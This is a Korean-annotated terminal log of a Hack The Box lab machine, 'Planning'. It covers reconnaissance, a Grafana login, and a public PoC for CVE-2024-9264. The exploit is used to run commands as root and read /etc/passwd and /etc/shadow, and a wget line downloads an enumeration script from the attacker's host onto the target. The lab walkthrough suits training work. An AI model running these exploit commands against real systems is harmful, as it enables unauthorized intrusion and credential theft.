cat scan.txt 
# Nmap 7.95 scan initiated Thu May 29 13:53:52 2025 as: /usr/lib/nmap/nmap -sV -sC -Pn -oN scan.txt -O --open 10.10.32.103
Nmap scan report for 10.10.32.103
Host is up (0.57s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 29 13:54:38 2025 -- 1 IP address (1 host up) scanned in 45.85 seconds
내부 도메인으로 변경

┌──(root㉿codespaces-38cdce)-[/]
└─# echo "10.10.11.68 planning.htb" >> /etc/hosts

# ffuf 사용
 ffuf -u http://planning.htb -H "Host:FUZZ.planning.htb" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178 -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 662ms]
:: Progress: [66967/151265] :: Job [1/1] :: 87 req/sec :: Duration: [0:12:39] :: Errors: 0 ::

┌──(root㉿docker-desktop)-[/]
└─# http http://grafana.planning.htb/
HTTP/1.1 302 Found
Cache-Control: no-store
Connection: keep-alive
Content-Length: 29
Content-Type: text/html; charset=utf-8
Date: Tue, 03 Jun 2025 09:34:15 GMT
Location: /login
Server: nginx/1.24.0 (Ubuntu)
X-Content-Type-Options: nosniff
X-Frame-Options: deny
X-Xss-Protection: 1; mode=block

<a href="/login">Found</a>.



┌──(root㉿docker-desktop)-[/]
└─# http http://grafana.planning.htb/login

# 버전 확인
http http://grafana.planning.htb/login | grep version
Grafana v11.0.0

# 취약점 검색
sudo apt update
sudo apt install exploitdb
# 업데이트
searchsploit -u
# 안 나옴
searchsploit grafana

# 핵더박스측 제공 정보를 통한 로그인을 위해 폼 확인
http http://grafana.planning.htb/login | login

```
POST /login
Content-Type: application/json

{
  "user": "admin",
  "password": "0D5oT70Fq13EvB5r"
}

```

# 로그인
curl -c cookies.txt -X POST http://grafana.planning.htb/login \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","password":"0D5oT70Fq13EvB5r"}'

┌──(root㉿docker-desktop)-[/]
└─# curl -c cookies.txt -X POST http://grafana.planning.htb/login \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","password":"0D5oT70Fq13EvB5r"}'
# 로그인 성공
{"message":"Logged in","redirectUrl":"/"}
-c: 쿠키를 저장할 파일
-X POST: HTTP 메소드 지정


# 저장된 쿠키로 본격 접근
curl -b cookies.txt http://grafana.planning.htb/


# duckduckgo 설치
apt update
apt install ddgr
# 삭제
apt remove ddgr
# 검색
ddgr grafana 11 cve

# grafana 11.0.0 cve poc 구글링
https://github.com/nollium/CVE-2024-9264


# pyton 가상화 실행

python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# 취약점 실행
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "ls -la /" http://grafana.planning.htb

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "find / -name user | 2>/dev/null" http://grafana.planning.htb
/usr/bin/umount
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/su
/usr/bin/gpasswd

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "id" http://grafana.planning.htb
uid=0(root) gid=0(root) groups=0(root)


# kali 리버스 쉘 준비
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O linenum.sh
python3 -m http.server 8000

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -q "SELECT content FROM read_blob('/etc/passwd')" http://grafana.planning.htb
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -q "SELECT content FROM read_blob('/etc/shadow')" http://grafana.planning.htb

# 본격 쉘 실행
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "wget http://10.10.16.12:8080/linenum.sh" http://grafana.planning.htb

[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: wget http://10.10.16.12:8080/linenum.sh
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('wget http://10.10.16.12:8080/linenum.sh >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
--2025-06-03 13:48:11--  http://10.10.16.12:8080/linenum.sh
Connecting to 10.10.16.12:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'linenum.sh'

     0K .......... .......... .......... .......... .....     100% 17.7K=2.6s

2025-06-03 13:48:17 (17.7 KB/s) - 'linenum.sh' saved [46631/46631]

